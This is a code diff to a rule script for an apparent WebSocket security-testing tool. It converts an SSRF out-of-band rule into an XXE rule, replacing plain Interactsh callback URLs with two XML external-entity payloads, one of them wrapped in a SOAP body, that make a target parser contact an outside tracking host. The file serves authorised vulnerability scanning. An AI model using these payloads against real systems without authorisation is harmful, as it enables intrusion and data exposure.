@@ -4,16 +4,16 @@ from com.mitmws.anomalydetection import DetectedAnomaly
 from java.util import ArrayList
 
 def getName():
-    return "Interactsh urls for http, ftp, smtp"
+    return "Interactsh OOB tests for XXE"
     
 def getActiveRuleType():
     return "PAYLOAD-INTERACTSH"
 
 def getDescription():
-    return "If an interactsh server is available SSRF tests will be generated using a trackable id"
+    return "If an interactsh server is available XXE tests will be generated using a trackable id"
 
 def getCategory():
-    return "SSRF"
+    return "XXE"
     
 def getFrameScope():
   return ["TEXT","PING","PONG","CLOSE","BINARY","CONTINUATION"]
@@ -24,16 +24,11 @@ def getTestScope():
 def getOOBPayloads( interactsh ):
     payloads = []
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("http://{}".format(payload),payload))
-    
+    payloads.append(InteractShTestPayload("<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://" + payload + "\" >]><foo>&xxe;</foo>",payload))
+
     payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("https://{}".format(payload),payload))
-    
-    payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("ftp://{}".format(payload),payload))
-    
-    payload = interactsh.getPayload();
-    payloads.append(InteractShTestPayload("smtp://{}".format(payload),payload))
+    payloads.append(InteractShTestPayload("<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM " + payload + "> %dtd;]><xxx/>]]></foo></soap:Body>",payload))
+
     return payloads
   
 def analyze( websocket_messages ):
@@ -44,4 +39,3 @@ def selfTest():
     result = DetectionRuleSelfTestStatus()
     result.setSelfTestOK(True)
     return result
-
